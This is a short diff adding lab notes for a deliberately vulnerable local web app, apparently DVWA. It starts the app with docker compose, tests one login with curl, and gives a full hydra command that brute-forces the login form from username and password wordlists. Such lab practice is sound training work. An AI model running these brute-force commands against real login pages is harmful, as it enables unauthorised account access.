@@ -1,0 +1,7 @@
+sudo docker compose up -d
+
+curl -s -X GET "http://172.17.0.1:8081/vulnerabilities/brute/?username=admin&password=password&Login=Login#" \
+-H "Cookie: security=low; PHPSESSID=9425ca253e33c81c622efaea45968f83" | grep -oP '<p>.*?</p>'
+
+hydra -s 8081 -L users.txt -P pass.txt 172.17.0.1 http-get-form "/vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login[Cookie: security=low; PHPSESSID=9425ca253e33c81c622efaea45968f83; username=^USER^; password=^PASS^]:<p>Welcome to the password protected area ^USER^</p><img src=\"/hackable/users/^USER^.jpg\""
+
